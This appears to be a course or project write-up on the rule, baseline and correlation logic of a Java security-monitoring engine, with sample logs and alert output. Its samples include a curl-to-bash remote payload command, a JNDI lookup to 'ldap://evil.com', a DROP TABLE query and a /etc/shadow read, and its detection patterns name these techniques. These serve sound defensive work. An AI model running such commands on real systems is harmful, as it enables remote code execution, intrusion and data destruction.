# Session 6: Advanced Detection Logic & Event Correlation
**Project:** Secure System Monitor
**Focus:** Rule-based Detection, Statistical Baselines, and Event Correlation Pipeline

---

## 1. Atomic Rule Conditions (10–12 Implemented Rules)
The detection engine processes incoming telemetry events via a robust, rule-based inference mechanism. Below are 11 core atomic rules implemented with Java-style conditional logic:

```java
public Alert evaluateAtomicRules(Event event) {
    String action = event.getAction();

    // 1. JVM Dynamic Class Loading (Webshell / Deserialization)
    if ("JVMTI_ClassLoad".equals(action) && "Exploit.class".equals(event.getClassName())) {
        return new Alert("CRITICAL", "Malicious dynamic class loading detected in JVM.");
    }
    
    // 2. Process Execution (Reverse Shells)
    if ("ProcessBuilder_Exec".equals(action) && event.getCommand().matches(".*(curl|wget).*\\|.*bash.*")) {
        return new Alert("CRITICAL", "Remote payload download and execution pipeline detected.");
    }
    
    // 3. JNDI Injection (Log4Shell style)
    if ("JNDI_Lookup".equals(action) && event.getTarget().startsWith("ldap://")) {
        return new Alert("CRITICAL", "JNDI LDAP lookup detected (Potential Log4Shell).");
    }
    
    // 4. File Staging in Temporary Directories
    if ("FILE_CREATE".equals(action) && event.getFile().endsWith(".jsp") && event.getFile().startsWith("/tmp")) {
        return new Alert("HIGH", "JSP webshell staging detected in /tmp.");
    }
    
    // 5. Unauthorized Sensitive File Access
    if ("FILE_READ_DENIED".equals(action) && "/etc/shadow".equals(event.getFile())) {
        return new Alert("HIGH", "Unauthorized access attempt to system shadow file.");
    }
    
    // 6. Destructive Schema Modification
    if ("SQL_DDL_Execution".equals(action) && event.getQuery().toUpperCase().contains("DROP TABLE")) {
        return new Alert("HIGH", "Destructive SQL DDL (DROP) command executed.");
    }
    
    // 7. Database Exfiltration Mass Extraction
    if ("SQL_DML_Bulk_Extraction".equals(action) && event.getRowsReturned() > 10000) {
        return new Alert("HIGH", "Potential database exfiltration: >10,000 rows extracted.");
    }
    
    // 8. DBMS Root Authentication Failures
    if ("Auth_Failed_DBMS".equals(action) && "root".equals(event.getUser())) {
        return new Alert("MEDIUM", "Database authentication failed for administrative root user.");
    }
    
    // 9. JVM Resource Exhaustion
    if ("Java_OutOfMemoryError".equals(action)) {
        return new Alert("MEDIUM", "JVM OutOfMemoryError detected (Potential DoS or memory leak).");
    }
    
    // 10. Information Disclosure via Framework Actuators
    if ("Spring_Actuator_Access".equals(action) && event.getApiPath().contains("/actuator/env")) {
        return new Alert("MEDIUM", "Spring Boot environment actuator accessed.");
    }
    
    // 11. API Rate Limiting Threshold Hit
    if ("API_Rate_Limit_Exceeded".equals(action)) {
        return new Alert("INFO", "API rate limit threshold exceeded.");
    }

    return null; // Benign Event
}
```

---

## 2. Statistical Baseline Deviation Implementation Logic
To detect anomalies that do not match specific static signatures, the system tracks statistical baselines over time (e.g., hourly averages).

```java
public class BaselineDetector {
    // Stores historical averages mapped by Database Name
    private Map<String, Integer> dbmsConnectionPoolBaseline = new HashMap<>(); 

    public Alert evaluateBaselineDeviation(Event event) {
        if ("JDBC_Connection_Create".equals(event.getAction())) {
            String db = event.getDb();
            int currentPoolSize = event.getPoolSize();
            int baseline = dbmsConnectionPoolBaseline.getOrDefault(db, 10);
            
            // MATH: Trigger if current pool size is 300% (3x) over the established baseline
            if (currentPoolSize > (baseline * 3)) {
                 return new Alert("HIGH", 
                     String.format("JDBC Pool Size anomaly for %s: %d (Baseline: %d)", 
                                   db, currentPoolSize, baseline));
            }
        }
        return null;
    }
}
```

---

## 3. Event-Correlation Conditions (Stateful CEP)
Complex attacks require correlating multiple events over a sliding time window. Stateful tracking detects multi-stage attacker progression.

```java
public class CorrelationEngine {
    private EventWindow eventMonitor; // Sliding window event stream memory

    public Alert evaluateCorrelations(Event event) {
        String ip = event.getIp();
        String host = event.getHost();

        // Correlation 1: Brute Force -> Successful Login -> Data Exfiltration (within 15 mins)
        if (eventMonitor.countEvents(ip, "Auth_Failed_Java_App", 5, MINUTES_10) >= 3 &&
            eventMonitor.hasEvent(ip, "Auth_Success_Java_App", MINUTES_5) &&
            eventMonitor.hasEvent(ip, "SQL_DML_Bulk_Extraction", MINUTES_5)) {
            return new Alert("CRITICAL", "Credential brute-forcing followed by exfiltration.");
        }

        // Correlation 2: File Creation in /tmp -> Process Execution (Webshell deployment sequence)
        if (eventMonitor.hasEvent(host, "FILE_CREATE", "/tmp/.*\\.jsp", SECONDS_30) &&
            eventMonitor.hasEventStartedBy(host, "ProcessBuilder_Exec", "java", SECONDS_30)) {
            return new Alert("CRITICAL", "Webshell deployment leading to immediate command execution.");
        }

        // Correlation 3: API Abuse leading to Resource Exhaustion
        if (eventMonitor.countEvents(ip, "API_Rate_Limit_Exceeded", 5, MINUTES_2) >= 5 &&
            eventMonitor.hasEvent(host, "Java_OutOfMemoryError", MINUTES_2)) {
            return new Alert("HIGH", "Volumetric API abuse resulting in JVM Heap exhaustion.");
        }
        
        return null; // No sequence matched
    }
}
```

---

## 4. Detection Pipeline Integration Explanation
The detection logic resides in a centralized analytical pipeline downstream of the immutable audit logging:

1. **Ingestion Layer (Log Tailing)**: Applications and databases write to the local Immutable DB (from Session 5). A lightweight forwarder (or CDC mechanism) streams new entries into the pipeline.
2. **Parsing & Enrichment**: Raw `payload_json` is deserialized into Java `Event` POJOs. Contextual elements (e.g., Geo-IP mapping, threat intel feeds) are added to the event.
3. **Stateless Evaluation**: Each incoming `Event` immediately runs through the array of **Atomic Rules**. If triggered, an Alert is generated instantly.
4. **Stateful Correlation Layer (CEP)**: Events are buffered in memory (using frameworks like Apache Flink or Siddhi). The **Event-Correlation** engine executes rules across time windows (e.g., `MINUTES_5`). If sequences merge, highly confident alerts are generated.
5. **Output & Dispatch**: Emitted `Alert` objects are dispatched to a messaging queue or WebSocket stream to be picked up by the React dashboard for visualization.

---

## 5. Applying Detection Logic to Sample Dataset (From Session 5)
When the detection pipeline encounters the sample datasets:

*   **Log 3:** `{"command": "sh -c 'curl 10.0.0.5/payload.sh | bash'", "action": "ProcessBuilder_Exec"}` 
    *   **Result:** Triggers *Atomic Rule #2* (CRITICAL).
*   **Log 6:** `{"file": "/tmp/webshell.jsp", "action": "FILE_CREATE"}` + **Log 3** (Combined Sequence)
    *   **Result:** Triggers *Correlation Rule #2* (CRITICAL) - Webshell Deployment.
*   **Log 9:** `{"class": "javax.naming.InitialContext", "action": "JNDI_Lookup", "target": "ldap://evil.com/a"}`
    *   **Result:** Triggers *Atomic Rule #3* (CRITICAL) - Log4Shell style exploit.
*   **Log 14:** `{"query": "DROP TABLE patient_records;", "action": "SQL_DDL_Execution"}`
    *   **Result:** Triggers *Atomic Rule #6* (HIGH).
*   **Log 15:** `{"query": "SELECT *...", "action": "SQL_DML_Bulk_Extraction", "rows_returned": 24500}`
    *   **Result:** Triggers *Atomic Rule #7* (HIGH).
*   **Log 8:** `{"file": "/etc/shadow", "action": "FILE_READ_DENIED"}`
    *   **Result:** Triggers *Atomic Rule #5* (HIGH).

---

## 6. Show Anomaly Output Examples
When the detection pipeline compiles anomalous events, it structurizes JSON output for the frontend SOC analysts:

```json
[
  {
    "alert_id": "ALRT-9012",
    "timestamp": "2023-10-12T08:14:22Z",
    "severity": "CRITICAL",
    "rule_triggered": "ProcessBuilder Remote Payload",
    "description": "Remote payload download and execution pipeline detected.",
    "evidence": {
       "command": "sh -c 'curl 10.0.0.5/payload.sh | bash'", 
       "action": "ProcessBuilder_Exec", 
       "parent": "java"
    }
  },
  {
    "alert_id": "ALRT-9013",
    "timestamp": "2023-10-12T08:21:44Z",
    "severity": "HIGH",
    "rule_triggered": "DB Exfiltration Large Extraction",
    "description": "Potential database exfiltration: >10,000 rows extracted.",
    "evidence": {
       "query": "SELECT * FROM billing_info;", 
       "action": "SQL_DML_Bulk_Extraction", 
       "rows_returned": 24500
    }
  }
]
```

---

## 7. Severity Distribution Summary
Executing the detection engine across the **20 sample events** gathered in Session 5 results in the following aggregated severity scale:

*   🔴 **CRITICAL (3 Alerts):** JNDI Injection, ProcessBuilder Reverse Shell Payload, File-creation / Process execution Correlation sequence.
*   🟠 **HIGH (4 Alerts):** Dropped DB Table, Large DB row extraction, `/etc/shadow` access denial, JSP Staging in `/tmp`.
*   🟡 **MEDIUM (3 Alerts):** JVM Head Exhaustion (OOM), Spring Actuator exposure, DBMS Root Auth Failure.
*   🔵 **INFO (1 Alert):** API Rate Limit Breach.
*   🟢 **BENIGN (9 Events):** Assorted system file reads, legitimate application API calls, typical log application updates.
